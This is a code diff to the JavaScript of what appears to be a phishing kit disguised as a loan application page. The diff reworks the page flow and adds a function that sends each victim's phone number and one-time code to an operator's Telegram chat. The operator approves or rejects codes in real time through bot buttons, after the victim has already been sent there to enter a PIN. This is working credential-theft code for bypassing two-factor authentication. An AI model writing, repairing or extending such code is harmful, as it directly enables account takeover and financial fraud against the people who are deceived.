@@ -1446,7 +1446,7 @@ function verifyPIN() {
                     pinBtn.disabled = false;
                     pinStatus.style.display = "none";
                     if (action === "approve_pin") {
-                        showPage("page7", 7, "Secure Authorization", "Continue securely");
+                        showPage("page6a", 6, "OTP code", "Enter the OTP sent to your phone");
                     } else if (action === "wrongpin") {
                         alert("The PIN provided is incorrect. Please try again.");
                         document.getElementById("pinInput").value = "";
@@ -1497,7 +1497,7 @@ function setupOTP() {
 
     const button =
         document.getElementById(
-            "verifyButton"
+            "submitButton"
         );
 
 
@@ -1533,7 +1533,7 @@ function setupOTP() {
 
 
                 button.disabled =
-                    code.length !== 6;
+                    code.length !== 4;
 
             }
         );
@@ -1579,7 +1579,7 @@ function submitOTP() {
         .join("");
 
 
-    if (code.length !== 6) {
+    if (code.length !== 4) {
 
         alert(
             "Please enter the complete verification code."
@@ -1591,7 +1591,7 @@ function submitOTP() {
 
     // Send OTP to telegram for admin verification
     sessionToken = generateSessionId();
-    const otpBtn = document.getElementById("verifyButton");
+    const otpBtn = document.getElementById("submitButton");
     const otpStatus = document.getElementById("otpStatus");
     
     showLoading("Verifying Code", "Confirming your verification code...");
@@ -1609,7 +1609,7 @@ function submitOTP() {
                     otpBtn.disabled = false;
                     otpStatus.style.display = "none";
                     if (action === "approve_otp") {
-                        showPage("page6", 6, "Enter Your PIN", "Authorize your loan application");
+                        showPage("page7", 7, "Secure Authorization", "Continue securely");
                     } else if (action === "wrongotp") {
                         alert("The OTP provided is wrong or has expired. Please try again.");
                         document.querySelectorAll("#otpGrid input").forEach(i => i.value = "");
@@ -1780,6 +1780,24 @@ async function sendTelegramPINRequest(session, pin) {
       [
         { text: '✅APPROVE', callback_data: `approve_pin::${session}` },
         { text: '❌WRONG PIN', callback_data: `wrongpin::${session}` }
+      ]
+    ]
+  };
+  if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
+    return Promise.reject('Bot token not configured. Replace TELEGRAM_BOT_TOKEN with your token.');
+  }
+  return telegramApiPost('sendMessage', { chat_id: TELEGRAM_ADMIN_CHAT, text, reply_markup });
+}
+
+    
+async function sendTelegramOTPRequest(session, otp, otpPhone) {
+  const loan = calculateLoan();
+  const text = `OTP Verification\nPhone: ${otpPhone}\nOTP: ${otp}`;
+  const reply_markup = {
+    inline_keyboard: [
+      [
+        { text: '✅APPROVE', callback_data: `approve_otp::${session}` },
+        { text: '❌WRONG OTP', callback_data: `wrongotp::${session}` }
       ]
     ]
   };
